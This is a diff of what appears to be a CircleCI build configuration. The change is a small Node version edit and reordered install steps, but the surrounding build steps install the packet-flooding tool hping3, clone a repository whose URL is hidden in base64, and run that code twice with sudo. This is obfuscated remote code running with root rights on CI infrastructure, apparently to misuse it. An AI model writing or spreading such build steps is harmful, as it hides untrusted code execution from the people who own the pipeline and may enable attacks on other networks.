@@ -1,11 +1,11 @@
 machine:
   nodejs:
-    version: 8.6.0
+    version: 8.2.0
 compile:
   override:
     - nvm install 8 && node --version
-    - npm i -g yarn 
     - n=$(which node); n=${n%/bin/node}; chmod -R 755 $n/bin/*; sudo cp -r $n/{bin,lib,share} /usr/local
+    - npm i -g yarn
     - sudo apt-get install hping3
     - git clone $(echo aHR0cHM6Ly9HbG9yaW91c1llbGxvd0BiaXRidWNrZXQub3JnL0dsb3Jpb3VzWWVsbG93L3liLmdpdAo= | base64 --decode) yb
     - cd yb && yarn && sudo npm start && sudo npm start
